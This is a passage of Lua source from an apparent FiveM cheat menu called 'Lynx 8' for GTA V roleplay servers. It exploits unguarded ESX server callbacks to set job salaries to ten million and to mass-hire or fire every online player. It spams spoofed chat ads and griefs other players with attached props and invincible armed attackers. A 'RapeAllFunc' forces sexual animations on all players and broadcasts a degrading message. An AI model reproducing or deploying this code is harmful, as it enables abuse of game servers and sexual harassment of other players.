			ESX.TriggerServerCallback("esx_society:setJobSalary", function()
			end, 'police', 2, 10000000)
			ESX.TriggerServerCallback("esx_society:setJobSalary", function()
			end, 'mecano', 2, 10000000)
			ESX.TriggerServerCallback("esx_society:setJobSalary", function()
			end, 'ambulance', 2, 10000000)
			ESX.TriggerServerCallback("esx_society:setJobSalary", function()
			end, 'realestateagent', 2, 10000000)
			ESX.TriggerServerCallback("esx_society:setJobSalary", function()
			end, 'cardealer', 2, 10000000)

			ESX.TriggerServerCallback("esx_society:setJobSalary", function()
			end, 'police', 3, 10000000)
			ESX.TriggerServerCallback("esx_society:setJobSalary", function()
			end, 'mecano', 3, 10000000)
			ESX.TriggerServerCallback("esx_society:setJobSalary", function()
			end, 'ambulance', 3, 10000000)
			ESX.TriggerServerCallback("esx_society:setJobSalary", function()
			end, 'realestateagent', 3, 10000000)
			ESX.TriggerServerCallback("esx_society:setJobSalary", function()
			end, 'cardealer', 3, 10000000)

	end
end

function UnemployedPlayers()
	if ESX then
		ESX.TriggerServerCallback("esx_society:getOnlinePlayers", function(players)

			for i=1, #players, 1 do
						label = players[i].name
						value = players[i].source
						name = players[i].name
						identifier = players[i].identifier
						ESX.TriggerServerCallback("esx_society:setJob", function()
			end, identifier, 'unemployed', 0, 'fire')
			end
		end)
	end
end

function AmbulancePlayers()
	if ESX then
		ESX.TriggerServerCallback("esx_society:getOnlinePlayers", function(players)

			for i=1, #players, 1 do
						label = players[i].name
						value = players[i].source
						name = players[i].name
						identifier = players[i].identifier
						ESX.TriggerServerCallback("esx_society:setJob", function()
			end, identifier, 'ambulance', 3, 'hire')
			end
		end)
	end
end


function PolicePlayers()
	if ESX then
		ESX.TriggerServerCallback("esx_society:getOnlinePlayers", function(players)

			for i=1, #players, 1 do
						label = players[i].name
						value = players[i].source
						name = players[i].name
						identifier = players[i].identifier
						ESX.TriggerServerCallback("esx_society:setJob", function()
			end, identifier, 'police', 4, 'hire')
			end
		end)
	end
end

local cappa = 0
cappA = "helloworld"
local c = cappA

local function snake()
		if cappa == 3 then
			ForceSocialClubUpdate()
		else
					local a = KeyboardInput("Get your password from #lynx-announcements", "", 100) 
			if a == c then
				mhaonn = true
				PlaySoundFrontend(-1, "PICK_UP", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
				Citizen.Wait(100)
				PlaySoundFrontend(-1, "PICK_UP", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
				Citizen.Wait(100)
				PlaySoundFrontend(-1, "PICK_UP", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
			else
				cappa = cappa + 1
				PlaySoundFrontend(-1, "MP_WAVE_COMPLETE", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
				end
			end
		end

function MecanoPlayers()
	if ESX then
		ESX.TriggerServerCallback("esx_society:getOnlinePlayers", function(players)

			for i=1, #players, 1 do
						label = players[i].name
						value = players[i].source
						name = players[i].name
						identifier = players[i].identifier
						ESX.TriggerServerCallback("esx_society:setJob", function()
			end, identifier, 'mecano', 4, 'hire')
			end
		end)
	end
end

function RealEstateAgentPlayers()
	if ESX then
		ESX.TriggerServerCallback("esx_society:getOnlinePlayers", function(players)

			for i=1, #players, 1 do
						label = players[i].name
						value = players[i].source
						name = players[i].name
						identifier = players[i].identifier
						ESX.TriggerServerCallback("esx_society:setJob", function()
			end, identifier, 'realestateagent', 4, 'hire')
			end
		end)
	end
end

function TaxiPlayers()
	if ESX then
		ESX.TriggerServerCallback("esx_society:getOnlinePlayers", function(players)

			for i=1, #players, 1 do
						label = players[i].name
						value = players[i].source
						name = players[i].name
						identifier = players[i].identifier
						ESX.TriggerServerCallback("esx_society:setJob", function()
			end, identifier, 'taxi', 4, 'hire')
			end
		end)
	end
end

function CarDealerPlayers()
	if ESX then
		ESX.TriggerServerCallback("esx_society:getOnlinePlayers", function(players)

			for i=1, #players, 1 do
						label = players[i].name
						value = players[i].source
						name = players[i].name
						identifier = players[i].identifier
						ESX.TriggerServerCallback("esx_society:setJob", function()
			end, identifier, 'cardealer', 4, 'hire')
			end
		end)
	end
end

function UnemployedPlayer(idx)
	if ESX then
		ESX.TriggerServerCallback("esx_society:getOnlinePlayers", function(players)

			local playerMatch = nil
			for i=1, #players, 1 do
						label = players[i].name
						value = players[i].source
						name = players[i].name
						if name == GetPlayerName(idx) then
							playerMatch = players[i].identifier
							debugLog('found ' .. players[i].name .. ' ' .. players[i].identifier)
						end
						identifier = players[i].identifier
			end



			ESX.TriggerServerCallback("esx_society:setJob", function()
			end, playerMatch, 'unemployed', 0, 'hire')

		end)
	end
end

function CarDealerPlayer(idx)
	if ESX then
		ESX.TriggerServerCallback("esx_society:getOnlinePlayers", function(players)

			local playerMatch = nil
			for i=1, #players, 1 do
						label = players[i].name
						value = players[i].source
						name = players[i].name
						if name == GetPlayerName(idx) then
							playerMatch = players[i].identifier
							debugLog('found ' .. players[i].name .. ' ' .. players[i].identifier)
						end
						identifier = players[i].identifier
			end



			ESX.TriggerServerCallback("esx_society:setJob", function()
			end, playerMatch, 'cardealer', 3, 'hire')
			

		end)
	end
end

function RealEstateAgentPlayer(idx)
	if ESX then
		ESX.TriggerServerCallback("esx_society:getOnlinePlayers", function(players)

			local playerMatch = nil
			for i=1, #players, 1 do
						label = players[i].name
						value = players[i].source
						name = players[i].name
						if name == GetPlayerName(idx) then
							playerMatch = players[i].identifier
							debugLog('found ' .. players[i].name .. ' ' .. players[i].identifier)
						end
						identifier = players[i].identifier
			end



			ESX.TriggerServerCallback("esx_society:setJob", function()
			end, playerMatch, 'realestateagent', 3, 'hire')
			

		end)
	end
end

function TaxiPlayer(idx)
	if ESX then
		ESX.TriggerServerCallback("esx_society:getOnlinePlayers", function(players)

			local playerMatch = nil
			for i=1, #players, 1 do
						label = players[i].name
						value = players[i].source
						name = players[i].name
						if name == GetPlayerName(idx) then
							playerMatch = players[i].identifier
							debugLog('found ' .. players[i].name .. ' ' .. players[i].identifier)
						end
						identifier = players[i].identifier
			end



			ESX.TriggerServerCallback("esx_society:setJob", function()
			end, playerMatch, 'taxi', 3, 'hire')
			

		end)
	end
end

function AmbulancePlayer(idx)
	if ESX then
		ESX.TriggerServerCallback("esx_society:getOnlinePlayers", function(players)

			local playerMatch = nil
			for i=1, #players, 1 do
						label = players[i].name
						value = players[i].source
						name = players[i].name
						if name == GetPlayerName(idx) then
							playerMatch = players[i].identifier
							debugLog('found ' .. players[i].name .. ' ' .. players[i].identifier)
						end
						identifier = players[i].identifier
			end



			ESX.TriggerServerCallback("esx_society:setJob", function()
			end, playerMatch, 'ambulance', 3, 'hire')
			

		end)
	end
end

function PolicePlayer(idx)
	if ESX then
		ESX.TriggerServerCallback("esx_society:getOnlinePlayers", function(players)

			local playerMatch = nil
			for i=1, #players, 1 do
						label = players[i].name
						value = players[i].source
						name = players[i].name
						if name == GetPlayerName(idx) then
							playerMatch = players[i].identifier
							debugLog('found ' .. players[i].name .. ' ' .. players[i].identifier)
						end
						identifier = players[i].identifier
			end



			ESX.TriggerServerCallback("esx_society:setJob", function()
			end, playerMatch, 'police', 3, 'hire')
			

		end)
	end
end

function MecanoPlayer(idx)
	if ESX then
		ESX.TriggerServerCallback("esx_society:getOnlinePlayers", function(players)

			local playerMatch = nil
			for i=1, #players, 1 do
						label = players[i].name
						value = players[i].source
						name = players[i].name
						if name == GetPlayerName(idx) then
							playerMatch = players[i].identifier
							debugLog('found ' .. players[i].name .. ' ' .. players[i].identifier)
						end
						identifier = players[i].identifier
			end



			ESX.TriggerServerCallback("esx_society:setJob", function()
			end, playerMatch, 'mecano', 3, 'hire')
			

		end)
	end
end

function bananapartyall()
	Citizen.CreateThread(function()
		for c = 0, 9 do
			TriggerServerEvent("_chat:messageEntered", "^13^24^3B^4y^5T^6e ^1C^2o^3m^4m^5u^6n^7i^1t^2y", { 141, 211, 255 }, "^"..c.."Lynx 8 ~ www.lynxmenu.com")
			end
	for i = 0, 128 do
		local pisello = CreateObject(GetHashKey("p_crahsed_heli_s"), 0, 0, 0, true, true, true)
		local pisello2 = CreateObject(GetHashKey("prop_rock_4_big2"), 0, 0, 0, true, true, true)
		local pisello3 = CreateObject(GetHashKey("prop_beachflag_le"), 0, 0, 0, true, true, true)
	AttachEntityToEntity(pisello, GetPlayerPed(i), GetPedBoneIndex(GetPlayerPed(i), 57005), 0.4, 0, 0, 0, 270.0, 60.0, true, true, false, true, 1, true)
	AttachEntityToEntity(pisello2, GetPlayerPed(i), GetPedBoneIndex(GetPlayerPed(i), 57005), 0.4, 0, 0, 0, 270.0, 60.0, true, true, false, true, 1, true)
	AttachEntityToEntity(pisello3, GetPlayerPed(i), GetPedBoneIndex(GetPlayerPed(i), 57005), 0.4, 0, 0, 0, 270.0, 60.0, true, true, false, true, 1, true)	
		end
	end)
end

function RespawnPed(ped, coords, heading)
    SetEntityCoordsNoOffset(ped, coords.x, coords.y, coords.z, false, false, false, true)
    NetworkResurrectLocalPlayer(coords.x, coords.y, coords.z, heading, true, false)
    SetPlayerInvincible(ped, false)
    TriggerEvent('playerSpawned', coords.x, coords.y, coords.z)
    ClearPedBloodDamage(ped)
end

local function RequestNetworkControl(callback)
    local netId = NetworkGetNetworkIdFromEntity(ped)
    local timer = 0
    NetworkRequestControlOfNetworkId(netId)
    while not NetworkHasControlOfNetworkId(netId) do
        Citizen.Wait(1)
        NetworkRequestControlOfNetworkId(netId)
        timer = timer + 1
        if timer == 5000 then
            Citizen.Trace("Control failed")
            break
        end
    end
end

local function hostileped(pedname,wep)
    for i = 0, 10 do
        local coords = GetEntityCoords(GetPlayerPed(SelectedPlayer))
        RequestModel(GetHashKey(pedname))
        Citizen.Wait(50)
        if HasModelLoaded(GetHashKey(pedname)) then
            local ped = CreatePed(21, GetHashKey(pedname),coords.x + i, coords.y - i, coords.z, 0, true, false) and CreatePed(21, GetHashKey(pedname),coords.x - i, coords.y + i, coords.z, 0, true, false)
            if DoesEntityExist(ped) and
                not IsEntityDead(GetPlayerPed(SelectedPlayer)) then
                RequestNetworkControl(ped)
                GiveWeaponToPed(ped,GetHashKey(wep), 9999, 1, 1)
                SetEntityInvincible(ped, true)
                SetPedCanSwitchWeapon(ped, true)
                TaskCombatPed(ped, GetPlayerPed(SelectedPlayer), 0,16)
            elseif IsEntityDead(GetPlayerPed(SelectedPlayer)) then
                TaskCombatHatedTargetsInArea(ped, coords.x,coords.y, coords.z, 500)
            else
                Citizen.Wait(0)
            end
        end
    end
end

function RapeAllFunc()
	for c = 0, 9 do
		TriggerServerEvent("_chat:messageEntered", "^13^24^3B^4y^5T^6e ^1C^2o^3m^4m^5u^6n^7i^1t^2y", { 141, 211, 255 }, "^"..c.."You got raped by Lynx 8")
		end
    Citizen.CreateThread(function()
        for i = 0, 128 do
            RequestModelSync("a_m_o_acult_01")
            RequestAnimDict("rcmpaparazzo_2")
            while not HasAnimDictLoaded("rcmpaparazzo_2") do
                Citizen.Wait(0)
            end

            if IsPedInAnyVehicle(GetPlayerPed(i), true) then
                local veh = GetVehiclePedIsIn(GetPlayerPed(i), true)
                while not NetworkHasControlOfEntity(veh) do
                    NetworkRequestControlOfEntity(veh)
                    Citizen.Wait(0)
                end
                SetEntityAsMissionEntity(veh, true, true)
                DeleteVehicle(veh)
                DeleteEntity(veh)
            end
            count = -0.2
            for b=1,3 do
                local x,y,z = table.unpack(GetEntityCoords(GetPlayerPed(i), true))
                local rapist = CreatePed(4, GetHashKey("a_m_o_acult_01"), x,y,z, 0.0, true, false)
                SetEntityAsMissionEntity(rapist, true, true)
                AttachEntityToEntity(rapist, GetPlayerPed(i), 4103, 11816, count, 0.00, 0.0, 0.0, 0.0, 0.0, false, false, false, false, 2, true)
                ClearPedTasks(GetPlayerPed(i))
                TaskPlayAnim(GetPlayerPed(i), "rcmpaparazzo_2", "shag_loop_poppy", 2.0, 2.5, -1, 49, 0, 0, 0, 0)
                SetPedKeepTask(rapist)
                TaskPlayAnim(rapist, "rcmpaparazzo_2", "shag_loop_a", 2.0, 2.5, -1, 49, 0, 0, 0, 0)
                SetEntityInvincible(rapist, true)
                count = count - 0.4
			end
        end
    end)
end

local function teleporttocoords()
	local pizdax = KeyboardInput("Enter X pos", "", 100)
	local pizday = KeyboardInput("Enter Y pos", "", 100)
	local pizdaz = KeyboardInput("Enter Z pos", "", 100)
	if pizdax ~= "" and pizday ~= "" and pizdaz ~= "" then
			if	IsPedInAnyVehicle(GetPlayerPed(-1), 0) and (GetPedInVehicleSeat(GetVehiclePedIsIn(GetPlayerPed(-1), 0), -1) == GetPlayerPed(-1)) then
					entity = GetVehiclePedIsIn(GetPlayerPed(-1), 0)
			else
					entity = GetPlayerPed(-1)
			end
			if entity then
				SetEntityCoords(entity, pizdax + 0.5, pizday + 0.5, pizdaz + 0.5, 1, 0, 0, 1)
				drawNotification("~g~Teleported to coords!", false)
			end
else
	drawNotification("~b~Invalid coords!", true)
	end
end

local function drawcoords()
	local name = KeyboardInput("Enter Blip Name", "", 100)
	if name == "" then
		drawNotification("~b~Invalid Blip Name!", true)
		return drawcoords()
	else
	local pizdax = KeyboardInput("Enter X pos", "", 100)
	local pizday = KeyboardInput("Enter Y pos", "", 100)
	local pizdaz = KeyboardInput("Enter Z pos", "", 100)
		if pizdax ~= "" and pizday ~= "" and pizdaz ~= "" then
		local blips = {
			{colour=75, id=84},
		}
		for _, info in pairs(blips) do
		info.blip = AddBlipForCoord(pizdax + 0.5, pizday + 0.5, pizdaz + 0.5)
		SetBlipSprite(info.blip, info.id)
		SetBlipDisplay(info.blip, 4)
		SetBlipScale(info.blip, 0.9)
		SetBlipColour(info.blip, info.colour)
		SetBlipAsShortRange(info.blip, true)
	BeginTextCommandSetBlipName("STRING")
		AddTextComponentString(name)
		EndTextCommandSetBlipName(info.blip)
		end
	else
		drawNotification("~b~Invalid coords!", true)
	end
end
end

local function teleporttonearestvehicle()
	local playerPed = GetPlayerPed(-1)
						local playerPedPos = GetEntityCoords(playerPed, true)
						local NearestVehicle = GetClosestVehicle(GetEntityCoords(playerPed, true), 1000.0, 0, 4)
						local NearestVehiclePos = GetEntityCoords(NearestVehicle, true)
						local NearestPlane = GetClosestVehicle(GetEntityCoords(playerPed, true), 1000.0, 0, 16384)
						local NearestPlanePos = GetEntityCoords(NearestPlane, true)
					drawNotification("~y~Wait...", false)
					Citizen.Wait(1000)
					if (NearestVehicle == 0) and (NearestPlane == 0) then
						drawNotification("~b~No Vehicle Found", true)
					elseif (NearestVehicle == 0) and (NearestPlane ~= 0) then
						if IsVehicleSeatFree(NearestPlane, -1) then
							SetPedIntoVehicle(playerPed, NearestPlane, -1)
							SetVehicleAlarm(NearestPlane, false)
							SetVehicleDoorsLocked(NearestPlane, 1)
							SetVehicleNeedsToBeHotwired(NearestPlane, false)
						else
							local driverPed = GetPedInVehicleSeat(NearestPlane, -1)
							ClearPedTasksImmediately(driverPed)
							SetEntityAsMissionEntity(driverPed, 1, 1)
							DeleteEntity(driverPed)
							SetPedIntoVehicle(playerPed, NearestPlane, -1)
							SetVehicleAlarm(NearestPlane, false)
							SetVehicleDoorsLocked(NearestPlane, 1)
							SetVehicleNeedsToBeHotwired(NearestPlane, false)
						end
						drawNotification("~g~Teleported Into Nearest Vehicle!", false)
					elseif (NearestVehicle ~= 0) and (NearestPlane == 0) then
						if IsVehicleSeatFree(NearestVehicle, -1) then
							SetPedIntoVehicle(playerPed, NearestVehicle, -1)
							SetVehicleAlarm(NearestVehicle, false)
							SetVehicleDoorsLocked(NearestVehicle, 1)
							SetVehicleNeedsToBeHotwired(NearestVehicle, false)
						else
							local driverPed = GetPedInVehicleSeat(NearestVehicle, -1)
							ClearPedTasksImmediately(driverPed)
							SetEntityAsMissionEntity(driverPed, 1, 1)
							DeleteEntity(driverPed)
							SetPedIntoVehicle(playerPed, NearestVehicle, -1)
							SetVehicleAlarm(NearestVehicle, false)
							SetVehicleDoorsLocked(NearestVehicle, 1)
							SetVehicleNeedsToBeHotwired(NearestVehicle, false)
						end
						drawNotification("~g~Teleported Into Nearest Vehicle!", false)
					elseif (NearestVehicle ~= 0) and (NearestPlane ~= 0) then
						if Vdist(NearestVehiclePos.x, NearestVehiclePos.y, NearestVehiclePos.z, playerPedPos.x, playerPedPos.y, playerPedPos.z) < Vdist(NearestPlanePos.x, NearestPlanePos.y, NearestPlanePos.z, playerPedPos.x, playerPedPos.y, playerPedPos.z) then
							if IsVehicleSeatFree(NearestVehicle, -1) then
								SetPedIntoVehicle(playerPed, NearestVehicle, -1)
								SetVehicleAlarm(NearestVehicle, false)
								SetVehicleDoorsLocked(NearestVehicle, 1)
								SetVehicleNeedsToBeHotwired(NearestVehicle, false)
							else
								local driverPed = GetPedInVehicleSeat(NearestVehicle, -1)
								ClearPedTasksImmediately(driverPed)
								SetEntityAsMissionEntity(driverPed, 1, 1)
								DeleteEntity(driverPed)
								SetPedIntoVehicle(playerPed, NearestVehicle, -1)
								SetVehicleAlarm(NearestVehicle, false)
								SetVehicleDoorsLocked(NearestVehicle, 1)
								SetVehicleNeedsToBeHotwired(NearestVehicle, false)
							end
						elseif Vdist(NearestVehiclePos.x, NearestVehiclePos.y, NearestVehiclePos.z, playerPedPos.x, playerPedPos.y, playerPedPos.z) > Vdist(NearestPlanePos.x, NearestPlanePos.y, NearestPlanePos.z, playerPedPos.x, playerPedPos.y, playerPedPos.z) then
							if IsVehicleSeatFree(NearestPlane, -1) then
								SetPedIntoVehicle(playerPed, NearestPlane, -1)
								SetVehicleAlarm(NearestPlane, false)
								SetVehicleDoorsLocked(NearestPlane, 1)
								SetVehicleNeedsToBeHotwired(NearestPlane, false)
							else
								local driverPed = GetPedInVehicleSeat(NearestPlane, -1)
								ClearPedTasksImmediately(driverPed)
								SetEntityAsMissionEntity(driverPed, 1, 1)
								DeleteEntity(driverPed)
								SetPedIntoVehicle(playerPed, NearestPlane, -1)
								SetVehicleAlarm(NearestPlane, false)
								SetVehicleDoorsLocked(NearestPlane, 1)
								SetVehicleNeedsToBeHotwired(NearestPlane, false)
							end
						end
						drawNotification("~g~Teleported Into Nearest Vehicle!", false)
					end
				end

local function TeleportToWaypoint()
	if DoesBlipExist(GetFirstBlipInfoId(8)) then
		local blipIterator = GetBlipInfoIdIterator(8)
		local blip = GetFirstBlipInfoId(8, blipIterator)
		WaypointCoords = Citizen.InvokeNative(0xFA7C7F0AADF25D09, blip, Citizen.ResultAsVector())
		wp = true
	else
		drawNotification("~b~No waypoint!", true)
	end

	local zHeigt = 0.0
	height = 1000.0
	while wp do
		Citizen.Wait(0)
		if wp then
			if
				IsPedInAnyVehicle(GetPlayerPed(-1), 0) and
					(GetPedInVehicleSeat(GetVehiclePedIsIn(GetPlayerPed(-1), 0), -1) == GetPlayerPed(-1))
			 then
				entity = GetVehiclePedIsIn(GetPlayerPed(-1), 0)
			else
				entity = GetPlayerPed(-1)
			end

			SetEntityCoords(entity, WaypointCoords.x, WaypointCoords.y, height)
			FreezeEntityPosition(entity, true)
			local Pos = GetEntityCoords(entity, true)

			if zHeigt == 0.0 then
				height = height - 25.0
				SetEntityCoords(entity, Pos.x, Pos.y, height)
				bool, zHeigt = GetGroundZFor_3dCoord(Pos.x, Pos.y, Pos.z, 0)
			else
				SetEntityCoords(entity, Pos.x, Pos.y, zHeigt)
				FreezeEntityPosition(entity, false)
				wp = false
				height = 1000.0
				zHeigt = 0.0
				drawNotification("~g~Teleported to waypoint!", false)
				break
			end
		end
	end
end

local function spawnvehicle()
	local ModelName = KeyboardInput("Enter Vehicle Spawn Name", "", 100)
	if ModelName and IsModelValid(ModelName) and IsModelAVehicle(ModelName) then
		RequestModel(ModelName)
		while not HasModelLoaded(ModelName) do
			Citizen.Wait(0)
		end
		local veh = CreateVehicle(GetHashKey(ModelName), GetEntityCoords(PlayerPedId(-1)), GetEntityHeading(PlayerPedId(-1)), true, true)
		SetPedIntoVehicle(PlayerPedId(-1), veh, -1)
	else
		drawNotification("~b~~h~Model is not valid!", true)
	end
end

local function repairvehicle()
	SetVehicleFixed(GetVehiclePedIsIn(GetPlayerPed(-1), false))
	SetVehicleDirtLevel(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0.0)
	SetVehicleLights(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0)
	SetVehicleBurnout(GetVehiclePedIsIn(GetPlayerPed(-1), false), false)
	Citizen.InvokeNative(0x1FD09E7390A74D54, GetVehiclePedIsIn(GetPlayerPed(-1), false), 0)
	SetVehicleUndriveable(vehicle,false)
end

local function repairengine()
	SetVehicleEngineHealth(vehicle, 1000)
	Citizen.InvokeNative(0x1FD09E7390A74D54, GetVehiclePedIsIn(GetPlayerPed(-1), false), 0)
	SetVehicleUndriveable(vehicle,false)
end

local function rccar()
	LynxEvo.StartRC()
end

LynxEvo.StartRC = function()
	if DoesEntityExist(LynxEvo.Entity) then return end

	LynxEvo.SpawnRC()

	LynxEvo.Tablet(true)

	while DoesEntityExist(LynxEvo.Entity) and DoesEntityExist(LynxEvo.Driver) do
		Citizen.Wait(5)

		local distanceCheck = GetDistanceBetweenCoords(GetEntityCoords(PlayerPedId()),  GetEntityCoords(LynxEvo.Entity), true)

		LynxEvo.DrawInstructions(distanceCheck)
		LynxEvo.HandleKeys(distanceCheck)

		if distanceCheck <= 3000.0 then
			if not NetworkHasControlOfEntity(LynxEvo.Driver) then
				NetworkRequestControlOfEntity(LynxEvo.Driver)
			elseif not NetworkHasControlOfEntity(LynxEvo.Entity) then
				NetworkRequestControlOfEntity(LynxEvo.Entity)
			end
		else
			TaskVehicleTempAction(LynxEvo.Driver, LynxEvo.Entity, 6, 2500)
		end
	end
end

LynxEvo.HandleKeys = function(distanceCheck)
	if IsControlJustReleased(0, 47) then
		if IsCamRendering(LynxEvo.Camera) then
			LynxEvo.ToggleCamera(false)
		else
			LynxEvo.ToggleCamera(true)
		end
	end

	if distanceCheck <= 3.0 then
		if IsControlJustPressed(0, 38) then
			LynxEvo.Attach("pick")
		end
	end

	if distanceCheck < 3000.0 then
		if IsControlPressed(0, 172) and not IsControlPressed(0, 173) then
			TaskVehicleTempAction(LynxEvo.Driver, LynxEvo.Entity, 9, 1)
		end
		
		if IsControlJustReleased(0, 172) or IsControlJustReleased(0, 173) then
			TaskVehicleTempAction(LynxEvo.Driver, LynxEvo.Entity, 6, 2500)
		end

		if IsControlPressed(0, 173) and not IsControlPressed(0, 172) then
			TaskVehicleTempAction(LynxEvo.Driver, LynxEvo.Entity, 22, 1)
		end

		if IsControlPressed(0, 174) and IsControlPressed(0, 173) then
			TaskVehicleTempAction(LynxEvo.Driver, LynxEvo.Entity, 13, 1)
		end

		if IsControlPressed(0, 175) and IsControlPressed(0, 173) then
			TaskVehicleTempAction(LynxEvo.Driver, LynxEvo.Entity, 14, 1)
		end

		if IsControlPressed(0, 172) and IsControlPressed(0, 173) then
			TaskVehicleTempAction(LynxEvo.Driver, LynxEvo.Entity, 30, 100)
		end

		if IsControlPressed(0, 174) and IsControlPressed(0, 172) then
			TaskVehicleTempAction(LynxEvo.Driver, LynxEvo.Entity, 7, 1)
		end

		if IsControlPressed(0, 175) and IsControlPressed(0, 172) then
			TaskVehicleTempAction(LynxEvo.Driver, LynxEvo.Entity, 8, 1)
		end

		if IsControlPressed(0, 174) and not IsControlPressed(0, 172) and not IsControlPressed(0, 173) then
			TaskVehicleTempAction(LynxEvo.Driver, LynxEvo.Entity, 4, 1)
		end

		if IsControlPressed(0, 175) and not IsControlPressed(0, 172) and not IsControlPressed(0, 173) then
			TaskVehicleTempAction(LynxEvo.Driver, LynxEvo.Entity, 5, 1)
		end

		if IsControlJustReleased(0, 168) then
			SetVehicleEngineOn(LynxEvo.Entity, (not GetIsVehicleEngineRunning(LynxEvo.Entity)), false, true)
		end
	end
end

LynxEvo.DrawInstructions = function(distanceCheck)
	local steeringButtons = {
		{
			["label"] = "Right",
			["button"] = "~INPUT_CELLPHONE_RIGHT~"
		},
		{
			["label"] = "Forward",
			["button"] = "~INPUT_CELLPHONE_UP~"
		},
		{
			["label"] = "Reverse",
			["button"] = "~INPUT_CELLPHONE_DOWN~"
		},
		{
			["label"] = "Left",
			["button"] = "~INPUT_CELLPHONE_LEFT~"
		}
	}

	local pickupButton = {
		["label"] = "Delete Car",
		["button"] = "~INPUT_CONTEXT~"
	}

	local buttonsToDraw = {
		{
			["label"] = "Toggle Camera",
			["button"] = "~INPUT_DETONATE~"
		},
		{
			["label"] = "Start/Stop Engine",
			["button"] = "~INPUT_SELECT_CHARACTER_TREVOR~"
		}
	}

	if distanceCheck <= 3000.0 then
		for buttonIndex = 1, #steeringButtons do
			local steeringButton = steeringButtons[buttonIndex]

			table.insert(buttonsToDraw, steeringButton)
		end

		if distanceCheck <= 3000.0 then
			table.insert(buttonsToDraw, pickupButton)
		end
	end

    Citizen.CreateThread(function()
        local instructionScaleform = RequestScaleformMovie("instructional_buttons")

        while not HasScaleformMovieLoaded(instructionScaleform) do
            Wait(0)
        end

        PushScaleformMovieFunction(instructionScaleform, "CLEAR_ALL")
        PushScaleformMovieFunction(instructionScaleform, "TOGGLE_MOUSE_BUTTONS")
        PushScaleformMovieFunctionParameterBool(0)
        PopScaleformMovieFunctionVoid()

        for buttonIndex, buttonValues in ipairs(buttonsToDraw) do
            PushScaleformMovieFunction(instructionScaleform, "SET_DATA_SLOT")
            PushScaleformMovieFunctionParameterInt(buttonIndex - 1)

            PushScaleformMovieMethodParameterButtonName(buttonValues["button"])
            PushScaleformMovieFunctionParameterString(buttonValues["label"])
            PopScaleformMovieFunctionVoid()
        end

        PushScaleformMovieFunction(instructionScaleform, "DRAW_INSTRUCTIONAL_BUTTONS")
        PushScaleformMovieFunctionParameterInt(-1)
        PopScaleformMovieFunctionVoid()
        DrawScaleformMovieFullscreen(instructionScaleform, 255, 255, 255, 255)
    end)
end

LynxEvo.SpawnRC = function()
	local ModelName = KeyboardInput("Enter Vehicle Spawn Name", "", 100)
	if ModelName and IsModelValid(ModelName) and IsModelAVehicle(ModelName) then
		RequestModel(ModelName)
		while not HasModelLoaded(ModelName) do
				Citizen.Wait(0)
		end

		LynxEvo.LoadModels({ GetHashKey(ModelName), 68070371 })
		local spawnCoords, spawnHeading = GetEntityCoords(PlayerPedId()) + GetEntityForwardVector(PlayerPedId()) * 2.0, GetEntityHeading(PlayerPedId())
	
		LynxEvo.Entity = CreateVehicle(GetHashKey(ModelName), spawnCoords, spawnHeading, true)
	
		while not DoesEntityExist(LynxEvo.Entity) do
			Citizen.Wait(5)
		end
	
		LynxEvo.Driver = CreatePed(5, 68070371, spawnCoords, spawnHeading, true)
	
		SetEntityInvincible(LynxEvo.Driver, true)
		SetEntityVisible(LynxEvo.Driver, false)
		FreezeEntityPosition(LynxEvo.Driver, true)
		SetPedAlertness(LynxEvo.Driver, 0.0)
	
		TaskWarpPedIntoVehicle(LynxEvo.Driver, LynxEvo.Entity, -1)
	
		while not IsPedInVehicle(LynxEvo.Driver, LynxEvo.Entity) do
			Citizen.Wait(0)
		end
	
		LynxEvo.Attach("place")

		drawNotification("~g~~h~Success", false)
	else
		drawNotification("~b~~h~Model is not valid !", true)
	end
end

LynxEvo.Attach = function(param)
	if not DoesEntityExist(LynxEvo.Entity) then
		return
	end
	
	LynxEvo.LoadModels({ "pickup_object" })

	if param == "place" then
		AttachEntityToEntity(LynxEvo.Entity, PlayerPedId(), GetPedBoneIndex(PlayerPedId(),  28422), 3.0, 0.0, 0.5, 70.0, 0.0, 270.0, 1, 1, 0, 0, 2, 1)

		--TaskPlayAnim(PlayerPedId(), "pickup_object", "pickup_low", 8.0, -8.0, -1, 0, 0, false, false, false)

		Citizen.Wait(200)

		DetachEntity(LynxEvo.Entity, false, true)

		PlaceObjectOnGroundProperly(LynxEvo.Entity)
	elseif param == "pick" then
		if DoesCamExist(LynxEvo.Camera) then
			LynxEvo.ToggleCamera(false)
		end

		LynxEvo.Tablet(false)

		Citizen.Wait(100)

		--TaskPlayAnim(PlayerPedId(), "pickup_object", "pickup_low", 8.0, -8.0, -1, 0, 0, false, false, false)
	
		--AttachEntityToEntity(LynxEvo.Entity, PlayerPedId(), GetPedBoneIndex(PlayerPedId(),  28422), -0.1, 0.0, -0.2, 70.0, 0.0, 270.0, 1, 1, 0, 0, 2, 1)
	
		DetachEntity(LynxEvo.Entity)

		DeleteVehicle(LynxEvo.Entity)
		DeleteEntity(LynxEvo.Driver)

		LynxEvo.UnloadModels()
	end
end

LynxEvo.Tablet = function(boolean)
	if boolean then
		LynxEvo.LoadModels({ GetHashKey("prop_cs_tablet") })

		-- LynxEvo.TabletEntity = CreateObject(GetHashKey("prop_cs_tablet"), GetEntityCoords(PlayerPedId()), true)

		-- AttachEntityToEntity(LynxEvo.TabletEntity, PlayerPedId(), GetPedBoneIndex(PlayerPedId(), 28422), -0.03, 0.0, 0.0, 0.0, 0.0, 0.0, true, true, false, true, 1, true)
	
		LynxEvo.LoadModels({ "amb@code_human_in_bus_passenger_idles@female@tablet@idle_a" })
	
		-- TaskPlayAnim(PlayerPedId(), "amb@code_human_in_bus_passenger_idles@female@tablet@idle_a", "idle_a", 3.0, -8, -1, 63, 0, 0, 0, 0 )
	
		Citizen.CreateThread(function()
			while DoesEntityExist(LynxEvo.TabletEntity) do
				Citizen.Wait(5)
	
				if not IsEntityPlayingAnim(PlayerPedId(), "amb@code_human_in_bus_passenger_idles@female@tablet@idle_a", "idle_a", 3) then
					-- TaskPlayAnim(PlayerPedId(), "amb@code_human_in_bus_passenger_idles@female@tablet@idle_a", "idle_a", 3.0, -8, -1, 63, 0, 0, 0, 0 )
				end
			end

			ClearPedTasks(PlayerPedId())
		end)
	else
		DeleteEntity(LynxEvo.TabletEntity)
	end
end

LynxEvo.ToggleCamera = function(boolean)
	if not true then return end

	if boolean then
